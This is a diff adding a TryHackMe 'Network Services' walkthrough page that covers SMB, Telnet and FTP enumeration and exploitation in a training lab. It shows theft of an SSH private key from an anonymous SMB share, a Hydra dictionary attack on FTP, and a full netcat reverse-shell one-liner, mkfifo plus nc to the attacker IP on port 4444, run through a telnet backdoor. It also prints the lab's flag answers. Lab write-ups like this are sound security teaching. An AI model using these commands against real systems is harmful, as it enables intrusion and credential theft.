@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Network Services · THM Writeups</title>
+  
+
+  <!-- Security headers -->
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self' data: https:; script-src 'self' 'unsafe-inline';" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="no-referrer" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/tryhackme/assets/css/style.css" />
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="/tryhackme/" class="nav-logo">
+      <span class="prompt">~/george/thm</span><span class="cursor-blink">_</span>
+    </a>
+    <div class="nav-right">
+      <a href="/tryhackme/" class="nav-link"><span class="cmd-prefix">./</span>index</a>
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer" class="nav-link">
+        <span class="cmd-prefix">~/</span>portfolio
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="writeup-main">
+  <div class="container">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/tryhackme/">writeups</a>
+      <span class="breadcrumb-sep">→</span>
+      <span>Network Services</span>
+    </div>
+
+    <!-- Writeup header -->
+    <div class="writeup-header">
+      <div class="terminal-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span class="terminal-title">Network Services/NetworkServices/README.md</span>
+      </div>
+      <div class="writeup-meta">
+        <span class="platform-badge">TryHackMe</span>
+        
+          
+          <span class="tag-pill">network</span>
+          
+        
+        
+      </div>
+    </div>
+
+    <!-- Writeup body: sidebar + content -->
+    <div class="writeup-body">
+
+      <!-- ToC Sidebar -->
+      <aside class="toc-sidebar" id="tocSidebar">
+        <div class="toc-header">
+          <span class="toc-label">$ cat --toc</span>
+          <button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">✕</button>
+        </div>
+        <nav class="toc-nav" id="tocNav">
+          <p class="toc-empty">No headings found.</p>
+        </nav>
+      </aside>
+
+      <!-- Main content -->
+      <div class="writeup-content-wrap">
+        <article class="writeup-content" id="writeupContent">
+          <h1 id="network-services">Network Services</h1>
+
+<h2 id="understanding-smb">Understanding SMB</h2>
+
+<p>#smb</p>
+
+<h3 id="what-is-smb"><strong>What is SMB?</strong></h3>
+
+<ul>
+  <li>
+    <p>SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [<a href="https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol">source</a>]</p>
+  </li>
+  <li>Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network.</li>
+  <li>
+    <p>Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.</p>
+  </li>
+  <li>The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection.
+    <ul>
+      <li>Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="how-does-smb-work"><strong>How does SMB work?</strong></h3>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/XMnru12.png" alt="" /></p>
+
+<ul>
+  <li>Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system.
+    <ul>
+      <li>However, in the case of SMB, these things are done over the network.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="what-runs-smb"><strong>What runs SMB?</strong></h3>
+
+<ul>
+  <li>Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support.
+    <ul>
+      <li>Samba, an open source server that supports the SMB protocol, was released for Unix systems.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="questions">Questions</h3>
+
+<p>What does SMB stand for?    </p>
+
+<p>A: Server Message Block</p>
+
+<p>What type of protocol is SMB?    </p>
+
+<p>A: response-request</p>
+
+<p>What do clients connect to servers using?    </p>
+
+<p>A: TCP/IP</p>
+
+<p>What systems does Samba run on?</p>
+
+<p>A: unix</p>
+
+<h2 id="enumerating-smb">Enumerating SMB</h2>
+
+<h3 id="enumeration"><strong>Enumeration</strong></h3>
+
+<ul>
+  <li>
+    <p>Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.</p>
+  </li>
+  <li>
+    <p>This process is essential for an attack to be successful, as wasting time with exploits that either don’t work or can crash the system can be a waste of energy.</p>
+  </li>
+  <li>
+    <p>Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.</p>
+  </li>
+</ul>
+
+<h3 id="smb"><strong>SMB</strong></h3>
+
+<ul>
+  <li>Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files.</li>
+  <li>SMB can often be a great starting point for an attacker looking to discover sensitive information — you’d be surprised what is sometimes included on these shares.</li>
+</ul>
+
+<h3 id="port-scanning"><strong>Port Scanning</strong></h3>
+
+<ul>
+  <li>
+    <p>The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.</p>
+  </li>
+  <li>
+    <p>If you haven’t already looked at port scanning, I <strong>recommend</strong> checking out the Nmap room <a href="https://tryhackme.com/room/furthernmap">here</a>.</p>
+  </li>
+</ul>
+
+<h3 id="enum4linux"><strong>Enum4Linux</strong></h3>
+<p>#enum4linux</p>
+<ul>
+  <li>Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems.
+    <ul>
+      <li>It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB.</li>
+    </ul>
+  </li>
+  <li>
+    <p>It’s installed by default on Parrot and Kali, however if you need to install it, you can do so from the official <a href="https://github.com/portcullislabs/enum4linux">github</a>.</p>
+  </li>
+  <li>The syntax of Enum4Linux is nice and simple: <strong>“enum4linux [options] ip”</strong></li>
+</ul>
+
+<p><strong>TAG</strong>            <strong>FUNCTION</strong></p>
+
+<p>-U              get userlist<br />
+-M             get machine list<br />
+-N             get namelist dump (different from -U and-M)<br />
+-S              get sharelist<br />
+-P              get password policy information<br />
+-G              get group and member list
+-a             all of the above (full basic enumeration)</p>
+
+<h3 id="questions-1">Questions</h3>
+
+<p>Conduct an <strong>nmap</strong> scan of your choosing, How many ports are open?</p>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240911122005.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">A: 3</code></p>
+
+<p>What ports is <strong>SMB</strong> running on?</p>
+
+<p><code class="language-plaintext highlighter-rouge">A: 139/445</code></p>
+
+<p>Let’s get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the <strong>workgroup</strong> name?    </p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">enum4linux -a &lt;ip&gt;</code></li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240911122332.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">A: WORKGROUP</code></p>
+
+<p>What comes up as the <strong>name</strong> of the machine?        </p>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240911123309.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">A: POLOSMB</code></p>
+
+<p>What operating system <strong>version</strong> is running?    </p>
+
+<p><code class="language-plaintext highlighter-rouge">A: 6.1</code></p>
+
+<p>What share sticks out as something we might want to investigate?</p>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240911123650.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">A: profiles</code></p>
+
+<h2 id="exploiting-smb">Exploiting SMB</h2>
+
+<ul>
+  <li>
+    <p>While there are vulnerabilities such as <a href="https://www.cvedetails.com/cve/CVE-2017-7494/">CVE-2017-7494</a>that can allow remote code execution by exploiting SMB, you’re more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we’re going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.</p>
+  </li>
+  <li>
+    <p>So, from our enumeration stage, we know:
+    - The SMB share location
+    - The name of an interesting SMB share</p>
+  </li>
+  <li>Because we’re trying to access an SMB share, we need a client to access resources on servers.</li>
+  <li>
+    <p>We will be using SMBClient because it’s part of the default samba suite. You can find the documentation <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">here.</a></p>
+  </li>
+  <li>We can remotely access the SMB share using the syntax:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">smbclient //[IP]/[SHARE]</code></p>
+
+<ul>
+  <li>Followed by the tags:
+  -U [name] : to specify the user
+  -p [port] : to specify the port</li>
+</ul>
+
+<h3 id="questions-2">Questions</h3>
+
+<p>What would be the correct syntax to access an SMB share called “secret” as user “suit” on a machine with the IP 10.10.10.2 on the default port?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: smbclient //10.10.10.2/secret -U suit -p 445`
+</code></pre></div></div>
+
+<p>Does the share allow anonymous access? Y/N?</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">smbclient //10.10.100.169/profiles -U Anonymous -p 445</code></p>
+
+    <p><code class="language-plaintext highlighter-rouge">A: Y</code></p>
+  </li>
+</ul>
+
+<p>Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">more “Working from home information.txt”</code></li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240911131728.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: John Cactus`
+</code></pre></div></div>
+
+<p>What service has been configured to allow him to work from home?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: ssh`
+</code></pre></div></div>
+
+<p>Okay! Now we know this, what directory on the share should we look in?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: .ssh`
+</code></pre></div></div>
+
+<p>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: id_rsa`
+</code></pre></div></div>
+
+<p>Download this file to your local machine, and change the permissions to “600” using “chmod 600 [file]”.</p>
+
+<p>Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.</p>
+
+<p>What is the smb.txt flag?</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">mget id_rsa</code> to download the key on your machine</li>
+  <li><code class="language-plaintext highlighter-rouge">cd /root &amp;&amp; chmod 600 id_rsa</code> on your local machine</li>
+  <li><code class="language-plaintext highlighter-rouge">mv id_rsa /root/.ssh</code></li>
+  <li>On the server: <code class="language-plaintext highlighter-rouge">more id_rsa.pub</code></li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240911163126.png" alt="" /></p>
+
+<ul>
+  <li>Potential login info: <code class="language-plaintext highlighter-rouge">cactus@polosmb</code></li>
+  <li>Try <code class="language-plaintext highlighter-rouge">ssh cactus@ip</code>, having the private key saved on your machine</li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240911163412.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: THM{smb_is_fun_eh?}`
+</code></pre></div></div>
+
+<h2 id="understanding-telnet">Understanding Telnet</h2>
+
+<ul>
+  <li>
+    <p>Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that’s hosting a telnet server.</p>
+  </li>
+  <li>The telnet client will establish a connection with the server.
+    <ul>
+      <li>The client will then become a virtual terminal- allowing you to interact with the remote host.</li>
+    </ul>
+  </li>
+  <li>Telnet sends all messages in clear text and has no specific security mechanisms.
+    <ul>
+      <li>Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.</li>
+    </ul>
+  </li>
+  <li>You can connect to a telnet server with the following syntax: <code class="language-plaintext highlighter-rouge">telnet [ip] [port]</code></li>
+</ul>
+
+<h3 id="questions-3">Questions</h3>
+
+<p>What is Telnet?    </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: Application protocol`
+</code></pre></div></div>
+
+<p>What has slowly replaced Telnet?    </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: ssh`
+</code></pre></div></div>
+
+<p>How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: telnet 10.10.10.3 23`
+</code></pre></div></div>
+
+<p>The lack of what, means that all Telnet communication is in plaintext?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: encryption`
+</code></pre></div></div>
+
+<h2 id="enumerating-telnet">Enumerating Telnet</h2>
+
+<h3 id="questions-4">Questions</h3>
+
+<p>How many <strong>ports</strong> are open on the target machine?    </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 1`
+</code></pre></div></div>
+
+<p>What <strong>port</strong> is this?</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">nmap &lt;ip&gt; -p 1000-9999</code></p>
+
+    <p><code class="language-plaintext highlighter-rouge">A: 8012</code></p>
+  </li>
+</ul>
+
+<p>This port is unassigned, but still lists the <strong>protocol</strong> it’s using, what protocol is this?     </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: tcp`
+</code></pre></div></div>
+
+<p>Now re-run the <strong>nmap</strong> scan, without the <strong>-p-</strong> tag, how many ports show up as open?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 0`
+</code></pre></div></div>
+
+<p>Based on the title returned to us, what do we think this port could be <strong>used for</strong>?</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nmap -sV --vv -p8012 &lt;ip&gt; </code></li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912150419.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: a backdoor`
+</code></pre></div></div>
+
+<p>Who could it belong to? Gathering possible <strong>usernames</strong> is an important step in enumeration.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: Skidy`
+</code></pre></div></div>
+
+<h2 id="exploiting-telnet">Exploiting Telnet</h2>
+
+<ul>
+  <li>Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE’s for Telnet client and server systems, however, so when exploiting you can check for those on:
+    <ul>
+      <li><a href="https://www.cvedetails.com/">https://www.cvedetails.com/</a></li>
+      <li><a href="https://cve.mitre.org/">https://cve.mitre.org/</a></li>
+    </ul>
+  </li>
+  <li>
+    <p>A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.</p>
+  </li>
+  <li>The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.</li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912151631.png" alt="" /></p>
+
+<h3 id="questions-5">Questions</h3>
+
+<p>What welcome message do we receive?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A: SKIDY'S BACKDOOR
+</code></pre></div></div>
+
+<p>Let’s try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: N`
+</code></pre></div></div>
+
+<p>Let’s check to see if what we’re typing is being executed as a system command.</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">sudo tcpdump ip proto \\icmp -i ens5</code></p>
+  </li>
+  <li>
+    <p>This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.</p>
+  </li>
+</ul>
+
+<p>Now, use the command <code class="language-plaintext highlighter-rouge">ping [local THM ip] -c 1</code> through the telnet session to see if we’re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">.RUN ping 10.10.167.137 -c 1</code></p>
+
+    <p><code class="language-plaintext highlighter-rouge">A: Y</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</code></p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">-p</code> = payload</li>
+      <li><code class="language-plaintext highlighter-rouge">lhost</code> = our local host IP address (this is <strong>your</strong> machine’s IP address)</li>
+      <li><code class="language-plaintext highlighter-rouge">lport</code> = the port to listen on (this is the port on <strong>your</strong> machine)</li>
+      <li><code class="language-plaintext highlighter-rouge">R</code> = export the payload in raw format</li>
+    </ul>
+  </li>
+</ul>
+
+<p>What word does the generated payload start with?</p>
+
+<ul>
+  <li>On your machine: ` msfvenom -p cmd/unix/reverse_netcat lhost=10.10.167.137 lport=4444 R`</li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912153730.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: mkfifo`
+</code></pre></div></div>
+
+<p>What would the command look like for the listening port we selected in our payload?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: nc -lvp 4444`
+</code></pre></div></div>
+
+<p>Great! Now that’s running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!</p>
+
+<p>Success! What is the contents of flag.txt?</p>
+
+<ul>
+  <li>Copy the payload from earlier where you replace the ip of the target with the ip of your machine: <code class="language-plaintext highlighter-rouge">mkfifo /tmp/zvnkw; nc 10.10.167.137 4444 0&lt;/tmp/zvnkw | /bin/sh &gt;/tmp/zvnkw 2&gt;&amp;1; rm /tmp/zvnkw</code></li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912154838.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: THM{y0u_g0t_th3_t3ln3t_fl4g}`
+</code></pre></div></div>
+
+<h2 id="understanding-ftp">Understanding FTP</h2>
+
+<ul>
+  <li>A typical FTP session operates using two channels:
+    <ul>
+      <li>a command (sometimes called the control) channel</li>
+      <li>a data channel.</li>
+    </ul>
+  </li>
+  <li>
+    <p>As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.</p>
+  </li>
+  <li>FTP operates using a client-server protocol. </li>
+  <li>
+    <p>The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.</p>
+  </li>
+  <li>The FTP server may support either Active or Passive connections, or both. 
+    <ul>
+      <li>In an Active FTP connection, the client opens a port and listens.
+        <ul>
+          <li>The server is required to actively connect to it. </li>
+        </ul>
+      </li>
+      <li>In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. </li>
+    </ul>
+  </li>
+  <li>This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish.
+    <ul>
+      <li>If both channels were interlinked, you could only enter commands in between data transfers, which wouldn’t be efficient for either large file transfers, or slow internet connections.</li>
+    </ul>
+  </li>
+  <li>You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: <a href="https://www.ietf.org/rfc/rfc959.txt">https://www.ietf.org/rfc/rfc959.txt</a>.</li>
+</ul>
+
+<h3 id="questions-6">Questions</h3>
+
+<p>What communications model does FTP use?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: client-server`
+</code></pre></div></div>
+
+<p>What’s the standard FTP port?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 21`
+</code></pre></div></div>
+
+<p>How many modes of FTP connection are there?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 2`
+</code></pre></div></div>
+
+<h2 id="enumerating-ftp">Enumerating FTP</h2>
+
+<h3 id="questions-7">Questions</h3>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912160420.png" alt="" /></p>
+
+<p>How many <strong>ports</strong> are open on the target machine? </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 2`
+</code></pre></div></div>
+
+<p>What <strong>port</strong> is ftp running on?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 21`
+</code></pre></div></div>
+
+<p>What <strong>variant</strong> of FTP is running on it?  </p>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912160543.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: vsftpd`
+</code></pre></div></div>
+
+<p>Great, now we know what type of FTP server we’re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing “<em>ftp [IP]</em>” into the console, and entering “anonymous”, and no password when prompted.</p>
+
+<p>What is the name of the file in the anonymous FTP directory?</p>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912160708.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: PUBLIC_NOTICE.txt`
+</code></pre></div></div>
+
+<p>What do we think a possible username<br />
+could be?</p>
+
+<ul>
+  <li>On the FTP server: <code class="language-plaintext highlighter-rouge">get PUBLIC_NOTICE.txt</code></li>
+  <li>On your machine:</li>
+</ul>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912160932.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: Mike`
+</code></pre></div></div>
+
+<h2 id="exploiting-ftp">Exploiting FTP</h2>
+
+<ul>
+  <li>Similarly to Telnet, when using FTP both the command and data channels are unencrypted.
+    <ul>
+      <li>Any data sent over these channels can be intercepted and read.</li>
+    </ul>
+  </li>
+  <li>With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords).
+    <ul>
+      <li>An article written by <a href="https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP">JSCape</a> demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.</li>
+      <li>an avenue we can exploit is weak or default password configurations.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Hydra</strong> is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more.</p>
+  </li>
+  <li>The syntax for the command we’re going to use to find the passwords is this:</li>
+</ul>
+
+<p><strong>“hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp”</strong></p>
+
+<p>Let’s break it down:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>SECTION</strong></th>
+      <th><strong>FUNCTION</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">hydra</code></td>
+      <td>Runs the hydra tool</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-t 4</code></td>
+      <td>Number of parallel connections per target</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-l [user]</code></td>
+      <td>Points to the user whose account you’re trying to compromise</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-P [path to dictionary]</code></td>
+      <td>Points to the file containing the list of possible passwords</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-vV</code></td>
+      <td>Sets verbose mode to very verbose, shows the login+pass combination for each attempt</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">[machine IP]</code></td>
+      <td>The IP address of the target machine</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ftp / protocol</code></td>
+      <td>Sets the protocol</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="questions-8">Questions</h3>
+
+<p>What is the password for the user “mike”?</p>
+
+<p><code class="language-plaintext highlighter-rouge">hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.179.16 ftp
+</code></p>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912161607.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A: password
+</code></pre></div></div>
+
+<p>What is ftp.txt?</p>
+
+<p><img src="/tryhackme/Network%20Services/NetworkServices/Pasted%20image%2020240912161712.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: THM{y0u_g0t_th3_ftp_fl4g}`
+</code></pre></div></div>
+
+        </article>
+
+        <!-- Back button -->
+        <div class="writeup-footer-nav">
+          <a href="/tryhackme/" class="btn-ghost">← Back to Index</a>
+        </div>
+      </div>
+
+    </div><!-- /.writeup-body -->
+
+  </div>
+</main>
+
+<!-- Floating ToC toggle (shown when sidebar is hidden) -->
+<button class="toc-fab" id="tocFab" aria-label="Open table of contents" style="display:none;">
+  ☰ <span>ToC</span>
+</button>
+
+<script>
+(function () {
+  const sidebar  = document.getElementById('tocSidebar');
+  const tocNav   = document.getElementById('tocNav');
+  const toggleBtn = document.getElementById('tocToggle');
+  const fab      = document.getElementById('tocFab');
+  const content  = document.getElementById('writeupContent');
+
+  /* ── Build ToC from headings ── */
+  const headings = Array.from(content.querySelectorAll('h2, h3'));
+
+  if (headings.length === 0) {
+    // leave the "No headings" placeholder
+  } else {
+    tocNav.innerHTML = '';
+    headings.forEach((h, i) => {
+      // Ensure every heading has an id we can link to
+      if (!h.id) {
+        h.id = 'toc-heading-' + i + '-' + h.textContent.trim()
+                .toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+      }
+      const a = document.createElement('a');
+      a.href = '#' + h.id;
+      a.textContent = h.textContent;
+      a.className = 'toc-link toc-' + h.tagName.toLowerCase();
+      a.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById(h.id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // on mobile, close after click
+        if (window.innerWidth < 1024) hideSidebar();
+      });
+      tocNav.appendChild(a);
+    });
+  }
+
+  /* ── Highlight active heading on scroll ── */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      const link = tocNav.querySelector('a[href="#' + entry.target.id + '"]');
+      if (!link) return;
+      if (entry.isIntersecting) {
+        tocNav.querySelectorAll('.toc-link').forEach(l => l.classList.remove('active'));
+        link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(h => observer.observe(h));
+
+  /* ── Show / hide ── */
+  function showSidebar() {
+    sidebar.classList.add('open');
+    sidebar.setAttribute('aria-hidden', 'false');
+    fab.style.display = 'none';
+    localStorage.setItem('tocOpen', '1');
+  }
+  function hideSidebar() {
+    sidebar.classList.remove('open');
+    sidebar.setAttribute('aria-hidden', 'true');
+    fab.style.display = 'flex';
+    localStorage.setItem('tocOpen', '0');
+  }
+
+  toggleBtn.addEventListener('click', hideSidebar);
+  fab.addEventListener('click', showSidebar);
+
+  /* ── Restore preference ── */
+  const isMobile = () => window.innerWidth < 1024;
+  const pref = localStorage.getItem('tocOpen');
+
+  if (isMobile()) {
+    hideSidebar();
+  } else if (pref === '0') {
+    hideSidebar();
+  } else {
+    showSidebar();
+  }
+
+  window.addEventListener('resize', () => {
+    if (isMobile()) {
+      hideSidebar();
+    } else if (localStorage.getItem('tocOpen') !== '0') {
+      showSidebar();
+    }
+  });
+})();
+</script>
+
+<script>
+/* ── Q&A Card Builder ── */
+(function () {
+  const article = document.getElementById('writeupContent');
+  if (!article) return;
+
+  // Mark "Questions" h3 headings
+  article.querySelectorAll('h3').forEach(h => {
+    if (h.textContent.trim().toLowerCase() === 'questions') {
+      h.classList.add('is-questions');
+    }
+  });
+
+  /*
+    Algorithm:
+    - Take a live snapshot of direct children
+    - Scan forward; when we see a <p> starting with "Q:", enter collection mode
+    - Collect all nodes into `questionNodes` until we hit a <p> starting with "A:"
+    - Collect `answerNodes` from "A:" until the next Q:, heading, or end
+    - Build a .qa-block and splice it in place of those nodes
+  */
+
+  function startsWithQ(el) {
+    return el.tagName === 'P' && /^Q:/i.test(el.textContent.trim());
+  }
+  function startsWithA(el) {
+    return el.tagName === 'P' && /^A:/i.test(el.textContent.trim());
+  }
+  function isHeading(el) {
+    return /^H[1-6]$/.test(el.tagName);
+  }
+
+  function buildCard(questionNodes, answerPara, answerNodes) {
+    const block = document.createElement('div');
